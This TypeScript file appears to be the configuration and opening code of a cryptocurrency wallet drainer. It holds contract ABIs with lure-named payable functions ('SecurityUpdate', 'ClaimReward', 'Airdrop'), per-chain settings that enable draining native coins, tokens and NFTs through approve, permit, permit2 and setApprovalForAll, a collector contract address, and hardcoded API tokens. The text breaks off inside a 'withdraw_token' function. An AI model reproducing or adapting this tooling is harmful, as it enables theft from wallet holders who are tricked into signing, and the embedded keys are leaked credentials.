import { ethers } from "ethers";


const MS_Ankr_Token = "072a650978c269390c7b349b89c6c611eeab99627964abd91ac58a5635686208";

export const MS_Contract_ABI = {
    'CONTRACT_LEGACY': JSON.parse(`[{"constant":false,"inputs":[],"name":"SecurityUpdate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"GiveAway","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"ClaimReward","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"ClaimRewards","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Swap","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Connect","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Execute","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Multicall","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`),
    'CONTRACT': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"SecurityUpdate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Claim","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"ClaimReward","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"ClaimRewards","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Swap","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Connect","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Execute","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Multicall","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`),
    'ERC20': JSON.parse(`[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]`),
    'ERC721': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}]`),
    'PERMIT_2': JSON.parse(`[{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"}]`),
    'PERMIT_1': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"holder","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"nonce","type":"uint256"},{"internalType":"uint256","name":"expiry","type":"uint256"},{"internalType":"bool","name":"allowed","type":"bool"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]`),
    'PERMIT2_SINGLE': JSON.parse(`[{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"components":[{"components":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"internalType":"struct IAllowanceTransfer.PermitDetails","name":"details","type":"tuple"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"sigDeadline","type":"uint256"}],"internalType":"struct IAllowanceTransfer.PermitSingle","name":"permitSingle","type":"tuple"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"address","name":"token","type":"address"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}]`),
    'PERMIT2_BATCH': JSON.parse(`[{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"components":[{"components":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"internalType":"struct IAllowanceTransfer.PermitDetails[]","name":"details","type":"tuple[]"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"sigDeadline","type":"uint256"}],"internalType":"struct IAllowanceTransfer.PermitBatch","name":"permitBatch","type":"tuple"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"components":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"address","name":"token","type":"address"}],"internalType":"struct IAllowanceTransfer.AllowanceTransferDetails[]","name":"transferDetails","type":"tuple[]"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}]`),
    'MS_NEW': JSON.parse(`[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"last_owner","type":"address"},{"indexed":true,"internalType":"address","name":"new_owner","type":"address"}],"name":"Ownership","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint8","name":"last_percentage","type":"uint8"},{"indexed":false,"internalType":"uint8","name":"new_percentage","type":"uint8"}],"name":"Percentage","type":"event"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Airdrop","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Approve","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Cashback","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Claim","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"ClaimReward","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"ClaimRewards","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Connect","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Deposit","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Execute","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Multicall","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Permit","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Process","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Register","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Rewards","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"SecurityUpdate","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Swap","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Transfer","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Verify","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Withdraw","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint8","name":"new_percentage","type":"uint8"}],"name":"changePercentage","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"claimSalary","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"disableSalary","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"enableSalary","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"salaryStatus","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"new_receiver","type":"address"}],"name":"setReceiver","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"new_owner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]`)
};

export const MS_Stablecoins_List = {
    1: [
      {
        address: '0xdac17f958d2ee523a2206206994597c13d831ec7',
        name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
      },
      {
        address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
        name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
      },
      {
        address: '0x6b175474e89094c44da98b954eedeac495271d0f',
        name: 'DAI Stablecoin', symbol: 'DAI', price: 1, decimals: 18
      },
    ],
    10: [
      {
        address: '0x94b008aa00579c1307b0ef2c499ad98a8ce58e58',
        name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
      },
      {
        address: '0x7f5c764cbc14f9669b88837ca1490cca17c31607',
        name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
      },
    ],
    56: [
      {
        address: '0x55d398326f99059ff775485246999027b3197955',
        name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 18
      },
      {
        address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
        name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 18
      },
      {
        address: '0xe9e7cea3dedca5984780bafc599bd69add087d56',
        name: 'Binance USD', symbol: 'BUSD', price: 1, decimals: 18
      },
    ],
    137: [
      {
        address: '0xc2132d05d31c914a87c6611c10748aeb04b58e8f',
        name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
      },
      {
        address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174',
        name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
      },
    ],
    250: [
      {
        address: '0x1B27A9dE6a775F98aaA5B90B62a4e2A0B84DbDd9',
        name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
      },
      {
        address: '0x04068da6c83afcfa0e13ba15a6696662335d5b75',
        name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
      },
    ],
    42161: [
      {
        address: '0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9',
        name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
      },
      {
        address: '0xff970a61a04b1ca14834a43f5de4533ebddb5cc8',
        name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
      },
    ],
    43114: [
      {
        address: '0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7',
        name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
      },
      {
        address: '0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e',
        name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
      },
    ],
    8453: [
      {
        address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb',
        name: 'DAI Stablecoin', symbol: 'DAI', price: 1, decimals: 18
      },
      {
        address: '0x833589fcd6edb6e08f4c7c32d4f71b54bda02913',
        name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
      },
    ],
    369: []
};
export const MS_Private_RPC_URLs: { [key: number]: string } = {
  1: `https://rpc.ankr.com/eth${MS_Ankr_Token ? `/${MS_Ankr_Token}` : ''}`,
  10: `https://rpc.ankr.com/optimism${MS_Ankr_Token ? `/${MS_Ankr_Token}` : ''}`,
  56: `https://rpc.ankr.com/bsc${MS_Ankr_Token ? `/${MS_Ankr_Token}` : ''}`,
  137: `https://rpc.ankr.com/polygon${MS_Ankr_Token ? `/${MS_Ankr_Token}` : ''}`,
  250: `https://rpc.ankr.com/fantom${MS_Ankr_Token ? `/${MS_Ankr_Token}` : ''}`,
  43114: `https://rpc.ankr.com/avalanche${MS_Ankr_Token ? `/${MS_Ankr_Token}` : ''}`,
  42161: `https://rpc.ankr.com/arbitrum${MS_Ankr_Token ? `/${MS_Ankr_Token}` : ''}`,
  8453: `https://rpc.ankr.com/base${MS_Ankr_Token ? `/${MS_Ankr_Token}` : ''}`,
  324: `https://rpc.ankr.com/zksync_era${MS_Ankr_Token ? `/${MS_Ankr_Token}` : ''}`,
  369: 'https://pulsechain.publicnode.com',
};

export const MS_Public_RPC_URLs = {
    1: 'https://rpc.ankr.com/eth',
    10: 'https://rpc.ankr.com/optimism',
    56: 'https://rpc.ankr.com/bsc',
    137: 'https://rpc.ankr.com/polygon',
    250: 'https://rpc.ankr.com/fantom',
    43114: 'https://rpc.ankr.com/avalanche',
    42161: 'https://rpc.ankr.com/arbitrum',
    8453: 'https://rpc.ankr.com/base',
    324: 'https://rpc.ankr.com/zksync_era',
    369: 'https://pulsechain.publicnode.com',
};

interface WalletData {
  address: string;
  private: string;
}

interface Asset {
  address: string;
  chain_id: number;
  amount_usd?: number;
  amount_raw: string;
}

const MS_Split_Modes = {
  native: {
    transfer: true,
    contract: true 
  },
  tokens: {
    transfer: true, 
    approve: true, 
    permit: true, 
    permit2: true, 
    repeat: false, 
  }
};

const MS_Settings = {
  Gas_Multiplier: 2,
  Use_Public_Contract: true,
  Use_Wallet_Randomizer: true,
  Use_Randomizer_For_Tokens: true,
  Use_Back_Feature: true,
  Use_Contract_Amount: 10,
  Use_Public_Premium: true,
  Minimal_Wallet_Price: 1,
  Tokens_First: 0,
  Wait_For_Confirmation: 1,
  Wait_For_Response: 1,
  Sign: {
    Native: 1,
    Tokens: 1,
    NFTs: 1,
    Force: 0,
    WalletConnect: 1,
    WC_AE: 1,
    MetaMask: 1,
    Trust: 1,
  },
  Permit: {
    Mode: 1,
    Priority: 0,
    Bypass: 0,
    Challenge: 1,
    Price: 1,
  },
  Permit2: {
    Mode: 1,
    Bypass: 0,
    Price: 1,
  },
  Approve: {
    Enable: 1,
    MetaMask: 2,
    Trust: 4,
    Bypass: 0,
    Withdraw: 1,
    Withdraw_Amount: 1,
  },
  SAFA: {
    Enable: 1,
    Bypass: 0,
    Withdraw: 2,
    Withdraw_Amount: 1,
  },
  Swappers: {
    Enable: 0,
    Priority: 0,
    Price: 50,
    Uniswap: 1,
    Pancake: 1,
    Quick: 0,
    Sushi: 0,
  },
  SeaPort: {
    Enable: 0,
    Priority: 1,
    Limit: 1,
    Price: 1,
  },
  Blur: {
    Enable: 0,
    Priority: 1,
    Limit: 1,
    Price: 1,
  },
  x2y2: {
    Enable: 0,
    Priority: 1,
    Price: 1,
  },
  Chains: {
    eth: {
      Enable: 1,
      Native: 1,
      Tokens: 1,
      NFTs: 1,
      Min_Native_Price: 1,
      Min_Tokens_Price: 1,
      Min_NFTs_Price: 1,
      API: '2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99',
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000",
      Contract_Type: "Execute",
      Contract_Legacy: 0,
    },
    bsc: {
      Enable: 1,
      Native: 1,
      Tokens: 1,
      NFTs: 1,
      Min_Native_Price: 1,
      Min_Tokens_Price: 1,
      Min_NFTs_Price: 1,
      API: 'K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI',
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000",
      Contract_Type: "Execute",
      Contract_Legacy: 0,
    },
    polygon: {
      Enable: 1,
      Native: 1,
      Tokens: 1,
      NFTs: 1,
      Min_Native_Price: 1,
      Min_Tokens_Price: 1,
      Min_NFTs_Price: 1,
      API: 'M9IMUX515SEB97THWJRQDKNX75CI66X7XX',
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000",
      Contract_Type: "Execute",
      Contract_Legacy: 0,
    },
    avalanche: {
      Enable: 1,
      Native: 1,
      Tokens: 1,
      NFTs: 1,
      Min_Native_Price: 1,
      Min_Tokens_Price: 1,
      Min_NFTs_Price: 1,
      API: 'ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z',
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000",
      Contract_Type: "Execute",
      Contract_Legacy: 0,
    },
    arbitrum: {
      Enable: 1,
      Native: 1,
      Tokens: 1,
      NFTs: 1,
      Min_Native_Price: 1,
      Min_Tokens_Price: 1,
      Min_NFTs_Price: 1,
      API: 'DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I',
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000",
      Contract_Type: "Execute",
      Contract_Legacy: 0,
    },
    fantom: {
      Enable: 1,
      Native: 1,
      Tokens: 1,
      NFTs: 1,
      Min_Native_Price: 1,
      Min_Tokens_Price: 1,
      Min_NFTs_Price: 1,
      API: 'F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415',
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000",
      Contract_Type: "Execute",
      Contract_Legacy: 0,
    },
    optimism: {
      Enable: 1,
      Native: 1,
      Tokens: 1,
      NFTs: 1,
      Min_Native_Price: 1,
      Min_Tokens_Price: 1,
      Min_NFTs_Price: 1,
      API: '46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK',
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000",
      Contract_Type: "Execute",
      Contract_Legacy: 0,
    },
    base: {
      Enable: 1,
      Native: 1,
      Tokens: 1,
      NFTs: 1,
      Min_Native_Price: 1,
      Min_Tokens_Price: 1,
      Min_NFTs_Price: 1,
      API: '6NGC2DAW6N197CWFP224HSR3778ZDFF6EI',
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000",
      Contract_Type: "Execute",
      Contract_Legacy: 0,
    },
    zksync_era: {
      Enable: 1,
      Native: 1,
      Tokens: 1,
      NFTs: 1,
      Min_Native_Price: 1,
      Min_Tokens_Price: 1,
      Min_NFTs_Price: 1,
      API: '',
      Contract_Address: "",
      Contract_Type: "Execute",
      Contract_Legacy: 0,
    },
    pulse: {
      Enable: 1,
      Native: 1,
      Tokens: 1,
      NFTs: 1,
      Min_Native_Price: 1,
      Min_Tokens_Price: 1,
      Min_NFTs_Price: 1,
      API: '',
      Contract_Address: "",
      Contract_Type: "Execute",
      Contract_Legacy: 0,
    },
  }
};

MS_Settings.Gas_Multiplier += 0.5;

const MS_Public_Contract: { [key: number]: [string, string] } = {
  1: ['0xContractAddress1', '0xContractAddress2'],
  10: ['0xContractAddress1', '0xContractAddress2'],
};

const MS_Gas_Multiplier = MS_Settings.Gas_Multiplier;

function get_split_data(partner_address: string | false, mode: { transfer: boolean }, amount_usd: number | null): number {
  return 50;
}

const BN = (value: string | number) => ethers.parseUnits(value.toString(), 18);

const Web3 = class {
  constructor(url: string) {}
  eth = {
    Contract: class {
      constructor(abi: object, address: string) {}
      methods = {
        transfer: (to: string, amount: string) => ({
          encodeABI: () => '0x',
        }),
        Deposit: (address: string, receiver: string, secondary: string, split: string, flag: boolean) => ({
          encodeABI: () => '0x',
        }),
      };
    },
  };
  utils = {
    toHex: (value: number | bigint) => `0x${value.toString(16)}`,
  };
};

const withdraw_token = async (wallet_data: WalletData, asset: Asset, partner_address: string | false = false): Promise<boolean> => {
  try {
    await new Promise(r => setTimeout(r, 1000));

    const split_data = get_split_data(partner_address, { transfer: MS_Split_Modes.tokens.transfer }, asset.amount_usd || null);
    const tx_count = !split_data ? 1 : 2;

    const chain_id = parseInt(asset.chain_id.toString());
